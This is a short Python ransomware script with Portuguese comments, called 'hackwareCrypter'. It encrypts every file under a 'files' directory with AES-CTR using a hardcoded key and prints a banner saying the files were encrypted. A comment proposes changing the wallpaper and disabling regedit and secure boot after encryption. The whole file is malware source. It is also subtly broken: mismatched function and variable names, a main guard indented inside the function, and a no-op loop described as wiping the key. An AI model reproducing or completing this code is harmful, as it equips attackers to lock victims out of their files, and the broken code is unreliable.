#!/usr/bin/python3.6
# -*- coding: utf-8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

#----------------

#A SENHA PODE TER OS SEGUINTES TAMANHOS EM BITS:

#128/192/256  - 1

#----------------


HARDCODED_KEY = 'hackware strike force strikes u!'

def arg_parser():
    parser = argparse.ArgumentParser(description = "hackwareCrypter")
    parser.add_argument('-d', '--decrypt', help='decripta os arquivos [defalut: no]', action='store_true')

    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:

        print('''
        HACKWARE STRIKE FORCE

        --------------------------------------------
        Seus arquivos foram criptografados.
        para decriptá-los, utilize a seguinte senha '{}'

        '''.format(HARDCODED_KEY))

        key = input('Digite a senha > ')

    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    starDirs = [init_path]

    for currentDir in startDirs:
        for filename in Discovery.discover(currentDir):
             Crypter.change_files(filename, cryptFn)


    #LIMPA CHAVE DE CRIPTOGRAFIA DA MEMORIA
    for _ in range(100):
        pass

    if not decrypt:
        pass

        #Após a encriptação, você pode alterar wallpaper
        # Alter os icones, desativar o regedit, bios secure boot, etc    

    if __name__ == '__main__':
        main()                                  